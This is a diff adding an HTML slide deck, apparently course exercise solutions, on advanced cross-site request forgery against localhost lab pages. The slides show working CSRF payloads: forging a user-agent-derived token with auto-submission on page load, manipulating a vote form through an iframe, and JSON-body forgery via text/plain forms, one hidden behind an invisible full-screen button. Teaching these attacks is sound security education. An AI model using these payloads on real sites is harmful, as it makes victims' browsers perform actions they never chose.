@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title></title>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <!--<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">-->
+  <!--<meta name="viewport" content="width=device-width, initial-scale=1.0">-->
+  <!--This one seems to work all the time, but really small on ipad-->
+  <!--<meta name="viewport" content="initial-scale=0.4">-->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <link rel="stylesheet" media="all" href="theme/css/default.css">
+  <link rel="stylesheet" media="only screen and (max-device-width: 480px)" href="theme/css/phone.css">
+  <base target="_blank"> <!-- This amazingness opens all links in a new tab. -->
+  <script data-main="js/slides" src="js/require-1.0.8.min.js"></script>
+</head>
+<body style="opacity: 0">
+
+<slides class="layout-widescreen">
+
+  <slide class="title-slide segue nobackground">
+    <aside class="gdbar"><img src="images/slide-institute/uulm-128.png"></aside>
+    <hgroup class="auto-fadein">
+      <h1 data-config-title><!-- populated from slide_config.json --></h1>
+      <h2 data-config-subtitle><!-- populated from slide_config.json --></h2>
+      <p data-config-presenter><!-- populated from slide_config.json --></p>
+    </hgroup>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>ex2-1</h2>
+    </hgroup>
+    <article>
+<pre class="prettyprint" data-lang="HTML">
+$token = sha1($_SERVER['HTTP_USER_AGENT']);
+
+if (isset($_POST['token'])) {
+</pre>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>ex2-1</h2>
+    </hgroup>
+    <article>
+<pre class="prettyprint" data-lang="HTML">
+&lt;html&gt;
+&lt;header&gt;
+&lt;script
+  src="http://crypto-js.googlecode.com/svn/tags/3.1.2/build/rollups/sha1.js"&gt;&lt;/script&gt;
+&lt;/header&gt;
+&lt;body onload="loaded();" &gt;
+
+&lt;iframe name="iframe"&gt;&lt;/iframe&gt;
+&lt;form name="frmCSRF" method="POST"
+  action="http://localhost/advanced-csrf/leaking/index.php" target="iframe"&gt;
+  &lt;input type="text" name="token" id="token" value="" /&gt;
+  &lt;textarea name="msg" cols="15" rows="5"&gt;harharhar&lt;/textarea&gt;
+&lt;/form&gt;
+
+&lt;script type="text/javascript"&gt;
+function loaded() {
+  document.getElementById('token').value = CryptoJS.SHA1(navigator.userAgent);
+  document.frmCSRF.submit();
+}
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</pre>
+    </article>
+  </slide>
+
+
+  <slide>
+    <hgroup>
+      <h2>ex2-2</h2>
+    </hgroup>
+    <article>
+<pre class="prettyprint" data-lang="HTML">
+&lt;script type="text/javascript"&gt;
+function loaded() { 
+  $("#ifr").contents().find("select option[value=banana]").attr("selected",true); 
+  $("#ifr").contents().find("form").submit();
+}
+&lt;/script&gt;
+
+&lt;iframe onload="javascript:loaded()" id="ifr" src="./vote.php"&gt;&lt;/iframe&gt;
+</pre>
+
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>ex2-3</h2>
+    </hgroup>
+    <article class="build">
+    <div>
+<pre class="prettyprint" data-lang="JSON">
+{ "subscribe_to": "weekly_newsletter", "mail": "john@doe.com" }
+</pre>
+    </div>
+    <div>
+<pre class="prettyprint" data-lang="HTML">
+&lt;form method="POST" 
+  action="http://localhost/advanced-csrf/ex2-3/subscribe.php"
+  enctype="text/plain"&gt;
+
+  &lt;input type='text' 
+    name='{"subscribe_to":"weekly_newsletter","mail":"hon@doe.com", "ignore_me":"' 
+    value='"}' /&gt;
+
+  &lt;input type="submit" value="send" /&gt;
+
+&lt;/form&gt;
+</pre>
+</div>
+<div>
+<pre class="prettyprint" data-lang="JSON">
+
+{ 'subscribe_to': 'weekly_newsletter', 'mail': 'john@doe.com',  'ignore_me': '"}' }
+</pre>
+</div>
+<div>
+    </div>
+    </article>
+  </slide>
+
+  <slide>
+    <hgroup>
+      <h2>ex2-4</h2>
+    </hgroup>
+    <article>
+<pre class="prettyprint" data-lang="HTML">
+&lt;form method="POST"
+  action="http://localhost/advanced-csrf/ex2-4/api.php"
+  enctype="text/plain"&gt;
+
+  &lt;input 
+    type='text' 
+    name='{"action":"reset-voting","value":"all", "ignore_me":"' value='"}' /&gt;
+
+  &lt;input type='submit'
+    value="submit"
+    style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;"
+  /&gt;
+
+&lt;/form&gt;
+</pre>
+    </article>
+  </slide>
+
+
+  <slide class="thank-you-slide segue nobackground">
+    <article class="flexbox vleft">
+      <h2>Dankesch&ouml;n!</h2>
+      <br /> <br /> <br />
+
+      <pre class="prettyprint questions" data-lang="javascript" >
+audience.ask(questions);
+      </pre>
+
+	<br/> <br/> <br/>
+
+	<p style="font-size:0.7em;text-align:right;">
+      <img src="images/by.svg" style="float:right;margin-left:25px;" />
+      This presentation is licensed under the <br />
+      <a style="color:white;" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International</a> 
+      license.
+      </p>
+
+    </article>
+    <p class="auto-fadein" data-config-contact style="display:none;">
+      <!-- populated from slide_config.json -->
+    </p>
+  </slide>
+
+  <slide class="backdrop"></slide>
+
+</slides>
+
+
+<!--[if IE]>
+  <script src="http://ajax.googleapis.com/ajax/libs/chrome-frame/1/CFInstall.min.js"></script>
+  <script>CFInstall.check({mode: 'overlay'});</script>
+<![endif]-->
+</body>
+</html>
